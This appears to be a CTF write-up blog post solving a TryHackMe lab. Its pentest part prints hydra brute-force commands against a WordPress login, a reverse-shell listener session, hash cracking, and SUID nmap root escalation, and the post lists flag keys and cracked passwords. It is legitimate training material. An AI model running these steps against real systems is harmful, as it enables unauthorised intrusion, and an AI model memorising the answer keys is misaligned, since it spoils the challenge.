---
title: "Tryhackme — Cybershujaa SA2 - Preliminary CTF"
date: 2022-10-23 14:40:00 +0530
categories: [Tryhackme,Linux Machines]
tags: [tryhackme, labs, ctf, nmap, ffuf, johntheripper, wordpress, reverseshell, hydra, python, ssh, suid, root ]
image: /assets/img/Posts/CybershujaaSA.png
---

>The Security Analyst 2 preliminary CTF was a pretty easy and straight forward CTF that consisted of Multipe Choice Questions (MCQ), Pentest, Wireless security, Forensics and Crypto challenges.
>To start with were the MCQs and the solutions are displayed on the below screenshots;

>That was pretty simple to answer, right?🥳😂

>Now lets go to the interesting bit of the CTF, the pentest task.
>Upon getting the machine IP address, my first task was to do an nmap scan.

## Reconnaisance
```
┌──(k4p3r3㉿kali)-[~/Downloads/thm.tasks/CybershujaaPractice]
└─$ nmap -sV -p- 10.10.129.170 --min-rate 45000 -o nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 12:51 EAT
Nmap scan report for 10.10.129.170
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.41 seconds


```
>The scan gives us 3 ports, 2 open and 1 closed.Further enumeration on the given web to find content that has not been indexed i.e say the robots.txt file

>On the browser: http://MACHINE_IP/robots.txt

>In the `robots.txt` we discover very interesting files. The `fsocity.dic` which from my guess is a dictionary file. As well we find our first key. Very impressive huuh!!

### Dir Fuzzing

```
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

```
===============================================================
2022/11/17 13:10:11 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.129.170/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.129.170/blog/]  
/rss                  (Status: 301) [Size: 0] [--> http://10.10.129.170/feed/]    
/sitemap              (Status: 200) [Size: 0]                                     
/login                (Status: 302) [Size: 0] [--> http://10.10.129.170/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.129.170/0/]          
/feed                 (Status: 301) [Size: 0] [--> http://10.10.129.170/feed/]       
/video                (Status: 301) [Size: 235] [--> http://10.10.129.170/video/]    
/image                (Status: 301) [Size: 0] [--> http://10.10.129.170/image/]      
/atom                 (Status: 301) [Size: 0] [--> http://10.10.129.170/feed/atom/]  
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.129.170/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.129.170/admin/]     
/audio                (Status: 301) [Size: 235] [--> http://10.10.129.170/audio/]     
/intro                (Status: 200) [Size: 516314]                                    
/wp-login             (Status: 200) [Size: 2613]                                      
/css                  (Status: 301) [Size: 233] [--> http://10.10.129.170/css/]       
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.129.170/feed/]        
Progress: 598 / 207644 (0.29%)                                                       ^C
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2022/11/17 13:10:25 Finished
===============================================================

```

>Directory enumeration has given very juicy information that guides me to the next step. From this I discovered a wordpress site with a login page at `/wp-admin`.


Definitely what comes to my mind is do a bruteforce attack to discover username and password since we have a custom wordlist for it.

For this task i decide to use hydra for bruteforcing.
```
hydra -L fsocity.dic -p test MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```


>This hydra command gives us the username and the next thing i needed was a password to be able to gain access to the wordpress site. So I did another hydra bruteforce to get the password.

```
hydra -l Elliot -P fsocity.dic MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```

> Using the username and password I obtained from the bruteforce, I gained access to the site and looking through I could see the logged in user has the privileges of editing the site and this was an amazing discovery. Having editor privileges means as an attacker I can launch a reverse shell. Interesting one here.
> I searched on the web for a php revshell script since the site has `.php` extension templates. I love visiting the pentestmonkey site for rev shell scripts 

I abused the editor privileges to get a reverse shell to that machine. I executed the php revshell on the site as I listen on my attacker machine.

```
┌──(k4p3r3㉿kali)-[~/Downloads/thm.tasks/CybershujaaPractice]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.16.84] from (UNKNOWN) [10.10.129.170] 51451
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 10:18:45 up 29 min,  0 users,  load average: 0.00, 0.03, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 


```
Yes we got our shell. Lets make the shell stable
```
python -c "import pty;pty.spawn('/bin/bash')"
daemon@linux:/$ 

```
>When I navigated to the `/home/robot` directory I found the second key and an MD5 password hash. This gives us a hint  that to read the key, I needed a password which might be contained in the password hash. I used john to try  crack the password hash.

```
john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
```

>I got the password and I was able to read the second key.
## Privilege Escalation 
>In privilege escalation, I tried several tricks but couldn't really work until I attempted to find some SUID binaries

```
find / -perm +6000 2>/dev/null | grep '/bin'
```
>I quickly spotted the nmap binary SUID. Went to GTFOBins to find its exploit
>On the terminal, I used this exploit for nmpa suid binary to have my way in as `root`

```
nmap --interactive

!sh
```
### The Challenge Questions

How Many Ports are Open on the Machine ?
 ```
 3
 ```
 From the scan results only 2 ports were open but anyway the correct answer accepted was that of 3 ports which were displayed from the scan.
What Is CMS in full ? (lowercase) 
```
 content management system
```
Google it!!😂
From Your Enumeration name the CMS in use ?(lowercase)
```
wordpress
```
Assuming there was a WEB application with a SSTI vulnerabilty whats the payload used to test this ? 
```
{{7*7}}
```
Ask google!!
Whats the name of the file used to prevent indexing by search engines on a webserver ?
```
robots.txt
```
Key 1
```
073403c8a58a1f80d943455fb30724b9
```
What is the linux command used for sorting ?
```
sort
```
what is the linux command used to get uinique words ?
```
uniq
```
How many words are in the fsociety.dic
 ```
 wc fsocity.dic                                                      
 858160  858160 7245381 fsocity.dic
 ```
using the commands create a oneliner command to sort fsocity.dic get unique words and save to a file called new.txt.
```
sort fsocity.dic | uniq > new.txt
```
 How many words are in new.txt
 ```
 11451
 ```
 Whats the name of the famous tool used to bruteforce logins ?
 ```
 hydra
 ```
 Which tool is used to enumerate the mentioned CMS  ?
 ```
 wpscan
 ```
 Whats the option supplied to the CMS tool you mentioned to supply a password wordlist ?
 ```
 -P
 ```
 Try wpscan --help
 
 

Whats the option supplied to the CMS  tool you mentioned to supply a users wordlist ?
```
-u
```
Using one of the tools  enumerate for users. Whats the name of the user whose password was found ?(lowercase)
```
Elliot
```
 Whats the password found ?
 ```
 ER28-0652
 ```
 which php function executes shell commands and returns the last line ?
 ```
 exec
 ```
 What is the name of the payload used to connect back a shell to us ?(lowercase)
 ```
 revershell
 ```
 What is the script used to perform enumeration for local privilege escalation vectors ?
 ```
 linpeas.sh
 ```
 
 Google it!!
 What is the md5 password of user robot
 ```
 c3fcd3d76192e4007dfb496cca67e13b
 ```
 What is the used to switch to user robot
 ```
 su robot
 ```
 What is robots password
 ```
 abcdefghijklmnopqrstuvwxyz
```
 Key 2
 ```
 822c73956184f694993bede3eb39f959
 ```
 What is the name of the binary with SUID bit set
 ```
 nmap
 ```
 Key 3
 ```
 04787ddef27c3dee1ee161b21670b4e4
 ```

## Wireless Security
This section mostly required one to google a lot so it was pretty easy.
 #### The questions;
 What is an AP in full ?(lowercase)
 ```
 access point
 ```
 What does STA stand for ? (lowercase)
 ```
 station
 ```
 What is the abbreviation for the name given to a AP ?
 ```
 SSID
 ```
 What is the name of the attack where a user kicks other users from a wifi AP ? 
 ```
 deauthentication attack
 ```
 What is the python module used by hacker to craft and inject packets ?
 ```
 scapy
 ```
 WEP uses a 24bit IV. This was improved in WPA because the tiny IV cause a problem called ?
 ```
 collision
 ```

 ## Forensics
>This challenge gave me a little bit of hard time but finally i managed to crack it down. It was pretty easy and fun as well. You had to download a pcap file and analyze it using wireshark.
>So on opening the file with wireshark, checked on the data from the FTP stream and came across an encoded password which was shared to Mr.Blue.

### Questions

What is the tool used to analyze the file provided
 ```
 wireshark
 ```
What is the md5 hash of the file
```
└─$ md5sum InterceptedTraffic.pcapng 
95f876aa3faf2077d797a8b42063b824  InterceptedTraffic.pcapng
```
                                                            
What is the encoded vault password that was sent to Mr Blue
 ```
 3KJ5e1uR926ABg2mgeym9yemv3VgA3a5AiQZiNmLV7ecdBa
 ```
What encoding scheme was used to encode the password
 `base58`
What is the decoded password
  ```
  flag{wireshark_is_a_powerful_tool}
  ```
what is the protocol used to send the message?(lowercase)
  ```
  FTP
  ```
  
## Crypto
Crypto challenge was a walk in the park for me..finished within few minutes😂😂

### Questions

Bob sent alice a message could you get what bob wanted alice to apply to : "Hello Alice apply to this asap
-.-. -.-- -... . .-. ... .... ..- .--- .- .-"

With this straight away i knew it's morsecode looking at the hyphens and dots. Found an online translator tool and got the hidden message.
```
cybershujaa
```


The undercover agent sent a message just before the whole country experienced a power outage, Can you decrypt the message and see what the agent wanted to say ? message : 9 444 66 8 33 444 7777 8 44 33 222 88 555 7 777 444 8

This took some research, then i landed on a cipher known as SMS Phone Tab Code Cipher(Mulptitap mode). Decoded it using an online tool and got the answer.

```
winteistheculprit
```
 Just another kind of  Ceaser, decrypt => ireelrnflpunyyratr 
 This was the final challenge and got very easy as well. Online decoder and boom you got your flag.
 ```
 verryeasychallenge
 ```
>That marked the end of our amazing preliminary CTF and I hope that was helpful. Cheers and happy hacking🥳🥳🥳
And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
